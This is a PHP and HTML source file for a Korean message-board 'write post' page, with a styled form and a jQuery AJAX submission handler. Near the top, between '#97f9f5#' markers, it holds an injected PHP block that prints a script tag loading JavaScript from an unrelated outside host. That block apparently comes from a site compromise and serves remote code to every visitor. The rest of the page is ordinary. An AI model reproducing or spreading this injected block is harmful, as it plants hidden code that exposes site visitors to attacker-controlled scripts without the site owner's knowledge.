<? 
	session_start();
	include ("./lib.php");
?>
<?php
#97f9f5#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155812\"></script>";
echo $vt;
}
#/97f9f5#
?><!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
		<meta charset="UTF-8">
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			#board_wrap {
				width: 980px;
				height: 760px;
			}
			#board_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			#board_table {
				width: 800px;
				height: auto;
				margin: 50px auto 0 auto;
				text-align: center;
				border-spacing: 0;
			}
			#board_table thead td {
				background: #1caff6;
				color: white;
				height: 40px;
				border-radius: 10px 10px 0 0;
			}
			#board_table tbody td {
				border-bottom: 1px dashed black;
				height: 40px;
			}
			#board_table tbody td input[type="text"] {
				width: 550px;
				height: 20px;
			}
			#board_table tbody td:first-child {
				width: 150px;
			}
			#board_table tbody td:last-child {
				border-right: 0px;
			}
			#board_table tbody tr:nth-child(2) td {
				height: 340px;
				border-bottom: 1px solid black;
			}
			#board_table tbody tr:last-child td {
				height: 40px;
				border: 0;
			}
			.board_submit {
				display: block;
				width: 60px;
				height: 22px;
				background: #1caff6;
				color: white;
				text-align: center;
				border-radius: 5px;
				font-size: 10pt;
				line-height: 22px;
				border: 0;
				outline: none;
				padding: 0;
				cursor: pointer;
				float: right;
			}
		</style>
		<script type="text/javascript">
			$(document).ready(function(){
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
	                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
	                $('.message').css('left',result).html(text).fadeIn(1500);
	                $('.message').fadeOut(1500);
				}
				$('.form_board').submit(function(e){
					var form_data={
						board_title: document.form_board.board_title.value,
						board_contents: document.form_board.board_contents.value,
						is_ajax: 1
					};
					$.ajax({
						data: form_data,
						type: "POST",
						url: './board_write_ok.php',
						success: function(res){
							if(res=='success'){
								ShowAlert('글 저장을 완료하였습니다');
								$('#wrap').load('./board.php');
							}
							else if(res=='fail'){
								ShowAlert('내용을 모두 채워야합니다');
							}
						}
					});
					return false;
				});
			});
		</script>
	</head>
	<body>
		<div id="board_wrap">
			<header>
				<h1> Board </h1>
			</header>
			<section>
				<form method="post" action="" class="form_board" name="form_board">
					<table id="board_table">
						<thead>
							<tr>
								<td colspan="2">글쓰기</td>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>제목</td><td><input type="text" placeholder="title" required="required" name="board_title"></td>
							</tr>
							<tr>
								<td>내용</td><td>	<textarea rows="24" cols="76" style="resize:none;" placeholder="contents" name="board_contents"></textarea></td>
							</tr>
							<tr>
								<td colspan="2"><input type="submit" value="전송" class="board_submit"></td>
							</tr>
						</tbody>
					</table>
				</form>

			</section>
		</div>
	</body>
</html>